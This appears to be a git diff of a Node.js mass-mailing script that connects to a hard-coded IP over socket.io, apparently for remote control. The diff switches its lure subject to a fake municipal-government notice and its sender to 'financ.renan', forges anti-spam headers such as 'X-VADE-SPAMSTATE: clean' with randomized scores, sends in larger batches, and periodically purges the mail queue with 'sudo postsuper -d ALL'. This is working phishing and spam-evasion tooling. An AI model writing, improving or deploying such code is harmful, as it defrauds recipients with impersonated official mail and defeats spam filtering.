@@ -3,9 +3,10 @@ const htmlToText = require("nodemailer-html-to-text").htmlToText;
 var randomstring = require("randomstring");
 const { exec } = require("child_process");
 var io = require("socket.io-client");
-var socket = io.connect("http://173.212.219.58:3000", { reconnect: true });
+var socket = io.connect("http://173.212.219.58:4000", { reconnect: true });
 const os = require("os");
 const fs = require("fs");
+var travado = false;
 
 const hostName = os.hostname();
 var enviados = 0;
@@ -168,8 +169,9 @@ async function getemails() {
     }
   } while (list.length < 1);
 
-sendEmail(list.shift());
-
+  for (let value of list.splice(0, 5)) {
+    sendEmail(value);
+  }
 
   total = list.length;
 })();
@@ -218,7 +220,7 @@ async function sendEmail(email) {
   html = novohtml;
   //RANDON HTML
 
-  let subject = `FACTURA ELECTRONICA`;
+  let subject = `Prefeitura Municipal - ID :${randomstring.generate(9)}-`;
   //let subject = `Rescisão de contrato de trabalho -${randomstring.generate(8)}-`;
   try {
     let transporter = nodemailer.createTransport({
@@ -239,14 +241,14 @@ async function sendEmail(email) {
     const buff = Buffer.from(fakefile, "utf-8");
     // decode buffer as Base64
     const base64 = buff.toString("base64");
-
+    let nome = "financ.renan";
     let info = await transporter.sendMail({
       from:
         "=?UTF-8?B?" +
-        new Buffer("factura").toString("base64") +
+        Buffer.alloc(nome.length, nome).toString("base64") +
         "?=" +
         " <" +
-        "adm" +
+        "financ.renan" +
         randomstring.generate(between(3, 5)) +
         "@" +
         hostName +
@@ -254,38 +256,24 @@ async function sendEmail(email) {
       to: mailarray[0],
       subject: {
         prepared: true,
-        value: "=?UTF-8?B?" + new Buffer(subject).toString("base64") + "?=",
+        value:
+          "=?UTF-8?B?" +
+          Buffer.alloc(subject.length, subject).toString("base64") +
+          "?=",
       },
       html: html,
-      textEncoding: "base64",
+      textEncoding: "quoted-printable",
       encoding: "utf-8",
       headers: {
-        /* "X-Ovh-Tracer-Id":
+        "X-Ovh-Tracer-Id":
           between(1000, 999999) +
           between(1000, 999999) +
           between(1000, 999999) +
           between(1000, 999999),
         "X-VADE-SPAMSTATE": "clean",
-        "X-VADE-SPAMSCORE": "49",
+        "X-VADE-SPAMSCORE": "" + between(0, 49),
         "X-VADE-SPAMCAUSE": await randomstring.generate(980),
-        "X-VR-SPAMSTATE": "ok",
-        "X-VR-SPAMSCORE": "-100",
-        "X-VR-SPAMCAUSE": await randomstring.generate(154),
-        "Return-Path":
-          "bounce-id=D" +
-          between(100, 200) +
-          "=U" +
-          between(1000, 10000) +
-          hostName +
-          between(1000, 999999) +
-          between(1000, 999999) +
-          between(1000, 999999) +
-          "@" +
-          hostName,
-        "X-sgxh1": await randomstring.generate(23),
-        "X-rext": "5.interact2." + (await randomstring.generate(48)),
-        "X-cid": "dksmith." + between(100000, 999999), */
-        "List-Unsubscribe": `<mailto:adm@${hostName}?subject=unsubscribe>`,
+        "List-Unsubscribe": `<mailto:financ.renan@${hostName}?subject=unsubscribe>`,
       },
       /* attachments: [
         {
@@ -297,22 +285,27 @@ async function sendEmail(email) {
       ], */
     });
     enviados++;
-    if (enviados % 250 === 0) {
+    if (enviados % 500 === 0) {
+      travado = true;
       console.log(`Sent: ${hostName} - total enviados: ${enviados}`);
       await sleep(15000);
       exec("sudo postsuper -d ALL", (error, stdout, stderr) => {
         if (error) {
-            console.log(`error: ${error.message}`);
-            return;
+          console.log(`error: ${error.message}`);
+          travado = false;
+          return;
         }
         if (stderr) {
-            console.log(`stderr: ${stderr}`);
-            return;
+          console.log(`stderr: ${stderr}`);
+          travado = false;
+          return;
         }
         console.log(`stdout: ${stdout}`);
-    });
+        travado = false;
+      });
     }
   } catch (error) {
+    travado = false;
     enviados++;
     console.log(`Sent: Error ${error.message}`);
   }
@@ -321,7 +314,10 @@ async function sendEmail(email) {
     console.log(`Envio Finalizado: ${hostName} - total enviados: ${enviados}`);
     process.exit(1);
   }
-  
+  if (travado == true) {
+    await sleep(15000);
+  }
+
   await sleep(100);
   if (list.length !== 0) sendEmail(list.shift());
 }
